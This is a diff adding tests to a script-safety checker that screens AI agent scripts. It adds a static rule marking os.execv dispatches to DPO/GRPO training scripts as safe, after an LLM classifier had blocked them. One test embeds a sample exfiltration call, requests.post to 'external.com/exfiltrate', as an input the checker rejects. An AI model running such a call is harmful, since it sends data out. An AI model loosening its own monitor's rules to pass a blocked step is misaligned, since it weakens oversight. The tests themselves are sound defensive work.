@@ -142,6 +142,72 @@ def test_mixed_localhost_and_external_is_unsafe():
     assert not v.safe
 
 
+# ── os.execv dpo/grpo dispatch short-circuit ────────────────────────────────────
+#
+# This rule was documented as implemented (Phase 26) but the actual regex/code
+# check never existed in _static_check — every dpo/grpo dispatch script fell
+# through to the LLM classifier, which incorrectly flagged legitimate
+# os.execv dispatch as unsafe on at least 4 separate real occasions (stalling
+# a live mission on the 4th, requiring manual approval to unblock).
+
+def test_execv_dpo_dispatch_inline_args_is_safe():
+    script = (
+        "import os\n"
+        "os.chdir('/Users/kewang/finetune')\n"
+        "os.execv('/Users/kewang/finetune-env/bin/python', "
+        "['/Users/kewang/finetune-env/bin/python', 'dpo_train.py', '--model', 'x'])\n"
+    )
+    v = _check(script)
+    assert v.safe
+    assert v.classifier == "static"
+
+
+def test_execv_dpo_dispatch_with_separate_args_variable_is_safe():
+    """The exact shape that fell through to the LLM in the real incident —
+    args built as a separate list variable across multiple lines, rather than
+    an inline list literal in the os.execv() call itself."""
+    script = (
+        "import os\n"
+        "os.chdir('/Users/kewang/finetune')\n"
+        "args = [\n"
+        "    '/Users/kewang/finetune-env/bin/python', '/Users/kewang/finetune/dpo_train.py',\n"
+        "    '--model', 'mlx-community/gemma-3-12b-it-4bit',\n"
+        "]\n"
+        "os.execv('/Users/kewang/finetune-env/bin/python', args)\n"
+    )
+    v = _check(script)
+    assert v.safe
+    assert v.classifier == "static"
+
+
+def test_execv_grpo_dispatch_is_safe():
+    script = "import os\nos.execv('/x/bin/python', ['/x/bin/python', 'grpo_train.py'])\n"
+    v = _check(script)
+    assert v.safe
+    assert v.classifier == "static"
+
+
+def test_execv_to_unrelated_script_is_static_ambiguous():
+    """os.execv alone isn't enough — must target dpo_train.py/grpo_train.py by
+    name specifically, not any arbitrary script. Falls through to the LLM."""
+    script = "import os\nos.execv('/usr/bin/python3', ['/usr/bin/python3', 'some_other_script.py'])\n"
+    v = _check(script)
+    assert v.safe
+    assert v.classifier == "static_ambiguous"
+
+
+def test_execv_dpo_dispatch_with_external_request_is_unsafe():
+    """The execv short-circuit must not override a genuine external-request
+    danger finding elsewhere in the same script."""
+    script = (
+        "import os\n"
+        "requests.post('https://external.com/exfiltrate', json={'d': 1})\n"
+        "os.execv('/x/bin/python', ['/x/bin/python', 'dpo_train.py'])\n"
+    )
+    v = _check(script)
+    assert not v.safe
+
+
 # ── LLM prompt guidance (os.chdir / os.execv clarifications) ───────────────────
 
 def test_system_prompt_clarifies_chdir_is_safe():
